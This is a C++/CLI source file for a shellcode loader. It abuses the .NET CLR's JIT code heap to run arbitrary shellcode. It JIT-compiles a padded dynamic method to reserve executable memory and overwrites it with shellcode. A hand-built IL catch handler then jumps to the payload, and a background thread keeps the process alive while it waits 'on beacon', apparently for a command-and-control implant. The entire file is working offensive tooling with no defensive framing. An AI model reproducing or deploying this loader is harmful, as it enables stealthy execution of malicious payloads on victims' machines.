#include "3lkToShell.hpp"

#pragma managed(push, off)
static void InstallShellcode(void* dst, BYTE * shellcode, DWORD shellcode_size)
{
    memcpy(dst, (VOID *)shellcode, shellcode_size);
    free(shellcode);
    shellcode = NULL;
    FlushInstructionCache(GetCurrentProcess(), dst, shellcode_size);
    printf("[+] Shellcode installed @ 0x%p (in CLR HostCodeHeap)\n", dst);
}
#pragma managed(pop)

// A big managed padding array we index into to force the JIT to emit real work
// per-iteration in the sink DM (otherwise it may fold constant math away).
ref class SinkPad abstract sealed {
public:
    static array<Int64>^ Junk = gcnew array<Int64>(4096);
    static void Init() {
        for (int i = 0; i < Junk->Length; i++)
        {
            Junk[i] = (Int64)(i * 0x9E3779B97F4A7C15LL);  // Multiply with golden ratio to make sure its not folded
        }
    }
};

static IntPtr BuildSinkDM(int minNativeSize, [Out] int% outEstNativeSize)
{
    const int perIterNative = 20;     // conservative
    int iters = (minNativeSize / perIterNative) + 512;
    outEstNativeSize = iters * perIterNative;

    // Create a new dynamic method
    auto dm = gcnew DynamicMethod(
        "sink", Int64::typeid,
        gcnew array<Type^> { Int64::typeid },
        Object::typeid->Module, true);

    auto il = dm->GetILGenerator();

    FieldInfo^ junkFld = SinkPad::typeid->GetField(
        "Junk", BindingFlags::Static | BindingFlags::Public);

    // Prevent constant folding
    for (int i = 0; i < iters; i++) {
        il->Emit(OpCodes::Ldsfld, junkFld);           // push Junk
        il->Emit(OpCodes::Ldc_I4, i & 0xFFF);         // index (bounded)
        il->Emit(OpCodes::Ldelem_I8);                 // Junk[i]
        il->Emit(OpCodes::Ldarg_0);                   // arg0
        il->Emit(OpCodes::Xor);
        il->Emit(OpCodes::Starg_S, (Byte)0);
    }
    il->Emit(OpCodes::Ldarg_0);
    il->Emit(OpCodes::Ret);

    auto d = (Func<Int64, Int64>^)dm->CreateDelegate(Func<Int64, Int64>::typeid);
    // Force the JIT to compile now.
    (void)d->Invoke(0x1234567890ABCDEFLL);

    // Grab the JIT'd function pointer via internal MethodDescriptor accessor.
    MethodInfo^ getMD = dm->GetType()->GetMethod(
        "GetMethodDescriptor", BindingFlags::NonPublic | BindingFlags::Instance);
    Object^ rmhBoxed = getMD->Invoke(dm, nullptr);
    RuntimeMethodHandle rmh = safe_cast<RuntimeMethodHandle>(rmhBoxed);
    return rmh.GetFunctionPointer();
}

static Action^ BuildTrapDM(IntPtr shellcodeFP)
{
    auto dm = gcnew DynamicMethod(
        "trap", void::typeid, gcnew array<Type^>(0),
        Object::typeid->Module, true);
    auto info = dm->GetDynamicILInfo();

    ConstructorInfo^ ctor = Exception::typeid->GetConstructor(gcnew array<Type^>(0));
    int tokCtor = info->GetTokenFor(ctor->MethodHandle);

    // calli signature: STDCALL (0x02), 0 params, void return (0x01)
    array<Byte>^ sig = gcnew array<Byte> { 0x02, 0x00, 0x01 };
    int tokSig = info->GetTokenFor(sig);

    // Token for the catch clause type
    int tokException = info->GetTokenFor(Exception::typeid->TypeHandle);

    array<Byte>^ il = gcnew array<Byte>(25);
    il[0] = 0x73;                                                       // newobj <tokCtor>
    Array::Copy(BitConverter::GetBytes(tokCtor), 0, il, 1, 4);
    il[5] = 0x7A;                                                       // throw
    il[6] = 0x26;                                                       // pop (exception object on handler entry)
    il[7] = 0x21;                                                       // ldc.i8 <shellcodeFP>
    Array::Copy(BitConverter::GetBytes(shellcodeFP.ToInt64()), 0, il, 8, 8);
    il[16] = 0xD3;                                                       // conv.i
    il[17] = 0x29;                                                       // calli <tokSig>
    Array::Copy(BitConverter::GetBytes(tokSig), 0, il, 18, 4);
    il[22] = 0xDE; il[23] = 0x00;                                       // leave.s +0 -> offset 24
    il[24] = 0x2A;                                                       // ret

    info->SetCode(il, 8);
    info->SetLocalSignature(gcnew array<Byte> { 0x07, 0x00 });

    // Fat EH: 4-byte header + 1 * 24-byte clause = 28 bytes
    array<Byte>^ eh = gcnew array<Byte>(28);
    eh[0] = 0x41; eh[1] = 28; eh[2] = 0; eh[3] = 0;                    // Kind + DataSize
    Array::Copy(BitConverter::GetBytes((UInt32)0x0000), 0, eh, 4, 4);   // Flags = CATCH
    Array::Copy(BitConverter::GetBytes((UInt32)0), 0, eh, 8, 4);   // TryOff
    Array::Copy(BitConverter::GetBytes((UInt32)6), 0, eh, 12, 4);   // TryLen
    Array::Copy(BitConverter::GetBytes((UInt32)6), 0, eh, 16, 4);   // HandlerOff
    Array::Copy(BitConverter::GetBytes((UInt32)18), 0, eh, 20, 4);   // HandlerLen
    Array::Copy(BitConverter::GetBytes(tokException), 0, eh, 24, 4);   // ClassToken (System.Exception)
    info->SetExceptions(eh);

    return (Action^)dm->CreateDelegate(Action::typeid);
}


ref class TrapRunner abstract sealed {
public:
    // opts this method into receiving CSEs in its catch clause. Without it, the CLR would terminate the process instead of entering the catch statement
    [System::Runtime::ExceptionServices::HandleProcessCorruptedStateExceptions]

    // required companion attribute
    [System::Security::SecurityCritical]
    static void Fire(IntPtr shellcodeFP) {
        try {
            printf("[*] Trap thread TID: %lu (0x%lx)\n", GetCurrentThreadId(), GetCurrentThreadId());
            printf("[*] Building trap DM (catch handler -> calli(0x%llx))...\n", (unsigned long long)shellcodeFP.ToInt64());
            Action^ trap = BuildTrapDM(shellcodeFP);

            printf("[*] Invoking trap DM - shellcode runs from catch handler (SEH 2nd pass).\n");

            trap->Invoke();
            printf("[+] Trap returned normally (shellcode returned cleanly).\n");
        }
        catch (System::Exception^ e) {
            printf("[!] Trap thread caught %S\n",
                (const wchar_t*)Marshal::StringToHGlobalUni(e->GetType()->FullName).ToPointer());
        }
    }
};

// Threadproc wrapper (ParameterizedThreadStart takes Object^)
ref class ThreadPack {
public:
    IntPtr fp;
    void Go(Object^) {
        TrapRunner::Fire(fp);
    }
};

void Exec(BYTE* shellcode, DWORD shellcode_size) {
    printf("[+] Warming up the CLR...\n");
    System::GC::Collect();

    printf("[+] Priming the SinkPad...\n");
    SinkPad::Init();

    int reqd_jit_byte_size = (int)shellcode_size + 0x2000; // Extra 0x2000 slack past shellcode size for JIT prologue/epilogue/tables.
    printf("[*] Building sink DynamicMethods (>= %ld bytes)..\n", reqd_jit_byte_size);

    int native_size = 0;
    IntPtr sinkFP = BuildSinkDM(reqd_jit_byte_size, native_size);
    printf("[+] Sink DM JIT'd @ 0x%llx (target %d bytes)\n", (unsigned long long)sinkFP.ToInt64(), native_size);

    // Prove sinkFP lies in a CLR-owned RWX region (HostCodeHeap).
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(sinkFP.ToPointer(), &mbi, sizeof(mbi))) {
        printf("    sink region: base=0x%p size=0x%zx prot=0x%08lx\n",
            mbi.AllocationBase, mbi.RegionSize, mbi.Protect);
    }

    InstallShellcode(sinkFP.ToPointer(), shellcode, shellcode_size);

    // Fire the trap on a background thread so its eventual crash doesn't
    // take out main (which holds the process open for the beacon).
    auto pack = gcnew ThreadPack();
    pack->fp = IntPtr(sinkFP.ToPointer());
    Thread^ t = gcnew Thread(gcnew ParameterizedThreadStart(pack, &ThreadPack::Go));
    t->IsBackground = true;
    t->Start(nullptr);

    printf("[*] Trap thread launched (id %d).  Waiting on beacon...\n", t->ManagedThreadId);
}
